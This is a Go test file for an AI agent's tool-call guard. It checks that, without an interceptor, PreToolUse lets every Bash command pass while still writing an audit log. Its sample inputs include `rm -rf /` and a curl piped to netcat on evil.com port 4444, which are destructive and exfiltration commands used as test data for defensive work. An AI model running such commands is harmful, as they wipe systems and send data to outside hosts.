package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// 가로채기 없는 가드는 더 이상 아무것도 하드 차단하지 않습니다. 파괴·유출
// 차단은 DB 가로채기 규칙으로 옮겨 갔습니다(db.seedDefaultInterceptRulesV2).
// PreToolUse 는 모든 명령을 통과시키면서도 감사 로그에 남겨야 합니다.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// 감사 로그는 가드를 거친 호출을 여전히 모두 남깁니다.
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse
